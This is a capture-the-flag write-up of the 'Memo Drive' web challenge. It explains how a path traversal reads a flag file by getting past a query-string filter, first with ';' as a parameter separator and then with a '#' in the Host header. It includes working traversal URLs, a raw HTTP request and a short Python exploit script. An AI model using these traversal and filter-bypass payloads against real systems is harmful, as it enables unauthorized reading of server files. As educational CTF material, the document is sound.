# Memo Drive

I wasn't able to solve any challenge during the ctf as they were really hard for me, this solution is written based upon my understanding of the solution shared by other participants who were able to solve them during the ctf, so kudos to them :).

http://34.146.195.115/

![image](https://user-images.githubusercontent.com/31372554/160285877-28916c08-b8bf-4ca6-a75f-af0b30211500.png)


This how the challenge site looks like.
We can add any content inside the memo  and then save it.

The memo then can be accessed from an example url such as: http://34.146.195.115/view?4e939e79f9480c4f6e197f46b41edc7a=0_20220327123141

There is a xxs vulnerability , but we are not interested in it.
As there is nothing much in the web app let's look into the source code to understand what's goin on.

![image](https://user-images.githubusercontent.com/31372554/160286256-4e2115dd-c7e3-44b2-b400-a18494363676.png)



`/view?2987bf4c72b6ade55901d57df14810f7=0_20220327130706`

In the above path: `2987bf4c72b6ade55901d57df14810f7` is the clientId ,which is calculated using the below python code.

//code 1
```python
def getClientID(ip):
    key = ip + '_' + os.getenv('SALT')
    
    return hashlib.md5(key.encode('utf-8')).hexdigest()
```

`0_20220327130706` is the filename, which is created using below code. 

//code 2
```python
filename = str(idx) + '_' + datetime.datetime.now().strftime('%Y%m%d%H%M%S') #idx just refers to the no of memos
```

We also found that the , memo contents are stored in the filesystem.
In a directory structure like this: `./memo/2987bf4c72b6ade55901d57df14810f7/0_20220327130706`

```bash

memo@96cd1278fb0b:/usr/local/opt/memo-drive$ ls -R
.:
index.py  memo  requirements.txt  start.sh  static  view

./memo:
2987bf4c72b6ade55901d57df14810f7  flag

./memo/2987bf4c72b6ade55901d57df14810f7:
0_20220327130706

./static:
jquery.min.js  memo.css  memo.js

./view:
index.html  view.html
```

One more important thing, the flag is stored in a file  whose location is : `./memo/flag` , so we probably have to find a way to read this file.

//code 3
```python

Route('/view', endpoint=view)

def view(request):
    context = {}

    try:
        context['request'] = request
        clientId = getClientID(request.client.host)

        print("request.url.query: {}".format(request.url.query))

        if '&' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]):
            print("You are caught")
            raise
        
        filename = request.query_params[clientId]
        print("Filename: {}".format(filename))
        print("request.query_params: {}".format(request.query_params))
        print("request.query_params.keys(): {}".format(request.query_params.keys()))
        path = './memo/' + "".join(request.query_params.keys()) + '/' + filename
        print("Path: {}".format(path))
        
        f = open(path, 'r')
        contents = f.readlines()
        f.close()
        
        context['filename'] = filename
        context['contents'] = contents
    
    except:
        pass
    
    return templates.TemplateResponse('/view/view.html', context)
```

We can't simply just traverse one directory back to read the flag file, there is some check in place.


//Code 4
```python
if '&' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]):
    print("You are caught")
    raise
```

The above code checks if there is any `.` , `&` character in the request.url.query


I couldn't find any way to solve this challenge, so I waited for the  solution . The solutions were pretty amazing to me, there was also one unintended solution which kinda blew my mind.


-----------------------------

Intended Solution:
------------------

This is how the path is generated:

//code 5
```python
path = './memo/' + "".join(request.query_params.keys()) + '/' + filename
```

`request.query_params.keys()` returns the parameter names as an array

For eg: 
If this is the url: http://hack.x/?paramA=valueA&paramB=valueB
Then,
`request.query_params.keys()` will return  `dict_keys(['paramA', 'paramB'])`

`"".join` will just join both the values which will return `paramAparamB`


As we can't use `&` in our url due to the if condition check (check `Code 4` ).So we need to find some other way to include another parameter.
If the `&` character check wasn't there, we could have easily done something like:


?2987bf4c72b6ade55901d57df14810f7=flag&/..=

```python
>filename = request.query_params[clientId]
>print("Filename: {}".format(filename))
Filename: flag

>print("request.query_params: {}".format(request.query_params))
request.query_params: 2987bf4c72b6ade55901d57df14810f7=flag&/..=

>print("request.query_params.keys(): {}".format(request.query_params.keys()))
request.query_params.keys(): dict_keys(['2987bf4c72b6ade55901d57df14810f7', '/..'])

>path = './memo/' + "".join(request.query_params.keys()) + '/' + filename
Path: ./memo/2987bf4c72b6ade55901d57df14810f7/../flag
```

When this path  `./memo/2987bf4c72b6ade55901d57df14810f7/../flag` will be passed to open() function , it will return the contents of the *flag* file.

But as we can't use the `&` character this theory isn't possible currently.

------------------------------

**`&` and `;` are treated similarly**

If suppose this is the url: http://localhost/test?paramA=valueA;paramB=valueB
(Notice that we have used `;` instead of `&`)

```python
> print("request.query_params: {}".format(request.query_params))
paramA=valueA&paramB=valueB
```

Did you just saw what happened?
`;` was replaced with `&` , due to this behaviour we can now include another parameter. which will allow us to modify the path by traversing back.
The if condition checks for `.`  in `request.query_params[clientId]`  and in `request.url.query` in (code 4)

To bypass the check we can simply double url encode `.` and this will successfully bypass the check:


http://localhost/view?2987bf4c72b6ade55901d57df14810f7=flag;/%2e%2e

```python
>print("Filename: {}".format(filename))
Filename: flag

>print("request.query_params: {}".format(request.query_params))
request.query_params: 2987bf4c72b6ade55901d57df14810f7=flag&%2F..=

>print("request.query_params.keys(): {}".format(request.query_params.keys()))
request.query_params.keys(): dict_keys(['2987bf4c72b6ade55901d57df14810f7', '/..'])

Path: ./memo/2987bf4c72b6ade55901d57df14810f7/../flag
```

The flag will be shown in the page: `LINECTF{The_old_bug_on_urllib_parse_qsl_fixed}`
![image](https://user-images.githubusercontent.com/31372554/160285940-d0135264-b642-4fea-9881-9058e77a3bc8.png)


Thanks to the people who shared their solution :)

------------

Unintended Solution:
---------------------

@bbangjo shared this freaking awesome solution in the discord chat:

![chrome_pCxk1B4C6y](https://user-images.githubusercontent.com/31372554/160285965-8677a031-e779-437a-ab91-a8511739b584.png)

![chrome_JypblwVN97](https://user-images.githubusercontent.com/31372554/160285969-0488a4dd-2682-4085-9884-16ac9cb80666.png)

Here is the code:

```python
from requests import *

#url = "http://localhost:3000"
url = "http://my-server.com"
def ex():
    p = "/view?9a80c63d7c76528586dcecbd8c1c7416=flag&/.."
    h = {
        'Host': '34.146.195.115#'
    }
    r = get(url+p, headers=h)
    print (r.text)

if __name__ == "__main__":
    ex()
```

For more simplicity look at the below request:

```
GET /view?2987bf4c72b6ade55901d57df14810f7=flag&/.. HTTP/1.1
Host: 34.146.195.115#
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
```

Did you notice the `#` appended in the `Host` header value?

Because of this `#` character , now `request.url.query` doesn't returns anything.



```python
>print("request.url.query: {}".format(request.url.query))
request.url.query:
Filename: flag
request.query_params: 2987bf4c72b6ade55901d57df14810f7=flag&%2F..=
request.query_params.keys(): dict_keys(['2987bf4c72b6ade55901d57df14810f7', '/..'])
Path: ./memo/2987bf4c72b6ade55901d57df14810f7/../flag
```

As `request.url.query` doesn't returns anything the if codition check is easily bypassed:

```python
if '&' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]):
    print("You are caught")
    raise
```
